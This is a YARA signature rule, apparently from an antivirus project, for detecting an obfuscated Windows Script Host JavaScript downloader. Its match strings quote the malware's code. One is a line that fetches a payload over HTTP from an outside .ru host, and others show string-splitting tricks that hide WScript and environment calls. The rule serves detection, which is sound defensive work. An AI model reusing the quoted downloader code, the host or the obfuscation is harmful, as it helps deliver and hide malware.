rule sig_20160428_aa41204f507738ffffc9907c3e1543cc {
  meta:
    description = "datamaliciousorder - file 20160428_aa41204f507738ffffc9907c3e1543cc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d6503ffff910fea0aa5f383a4b3625e9acd9e27f7bff58defb7c202c0944891a"

  strings:
    $s1  = "function PfeDlzRueAzsZvuMcqZva(MoiVwlIirImmGgbTrzHui){OxmWdhKucXziKveEkxZdo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function PfeDlzRueAzsZvuMcqZva(MoiVwlIirImmGgbTrzHui){OxmWdhKucXziKveEkxZdo[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PkbKnaJrsNrvMhhJohAae() {return OxmWdhKucXziKveEkxZdo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function FilAxbNsgNylPfuZnvJne(IecXnoHcwMpwUouWrsLma, EulBajLabJwmQhlWepBxr){DbtJpdKbjEplNfaThjQbe = DbtJpdKbjEplNfaThjQbe * 1; " ascii
    $s5  = "return IecXnoHcwMpwUouWrsLma - EulBajLabJwmQhlWepBxr;};" fullword ascii
    $s6  = "LiaOuuDowOnpXxfCkpTxh[XtkKbeAtpDkbXowWstChs](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s7  = "var TjpRtmQqyKlhYmvNapNvq = this[\"WScript\"];" fullword ascii
    $s8  = "function PkbKnaJrsNrvMhhJohAae() {return OxmWdhKucXziKveEkxZdo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "if (LiaOuuDowOnpXxfCkpTxh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function ZavXshZvwGshLzyGenLbc(){return KnwMqmNtaYbpLbfYwtSow + \"\";};" fullword ascii
    $s11 = "var OxmWdhKucXziKveEkxZdo = function LhcFfmMwlZqmIobSacXvl() {return TjpRtmQqyKlhYmvNapNvq[FczNcaUccXrvFhfBneBbv](\"WScript\"+\"" ascii
    $s12 = "function FilAxbNsgNylPfuZnvJne(IecXnoHcwMpwUouWrsLma, EulBajLabJwmQhlWepBxr){DbtJpdKbjEplNfaThjQbe = DbtJpdKbjEplNfaThjQbe * 1; " ascii
    $s13 = "function DolEesAbsDpvEszIvhPsw() {return ((JklEvlFldOjbIpuQdwCcu == true) && (JklEvlFldOjbIpuQdwCcu == DxzMxhOguHhtTgnSniNhd)) ?" ascii
    $s14 = "function DolEesAbsDpvEszIvhPsw() {return ((JklEvlFldOjbIpuQdwCcu == true) && (JklEvlFldOjbIpuQdwCcu == DxzMxhOguHhtTgnSniNhd)) ?" ascii
    $s15 = "var OxmWdhKucXziKveEkxZdo = function LhcFfmMwlZqmIobSacXvl() {return TjpRtmQqyKlhYmvNapNvq[FczNcaUccXrvFhfBneBbv](\"WScript\"+\"" ascii
    $s16 = "return FilAxbNsgNylPfuZnvJne(1 == 1 ? EjmRvqMfxNizNzbZmbYdw : 0, 1 == 1 ? IhzPxbPypSgbNwvHxyEmh : 0);" fullword ascii
    $s17 = "var ZzkGbdQuvVsfHysHuqFti = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "DxzMxhOguHhtTgnSniNhd = true; " fullword ascii
    $s19 = "}while (RtlQqcRjpRncQatYmbEbv);" fullword ascii
    $s20 = "function EwdLbwWypGaoTfgFjhEmc(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}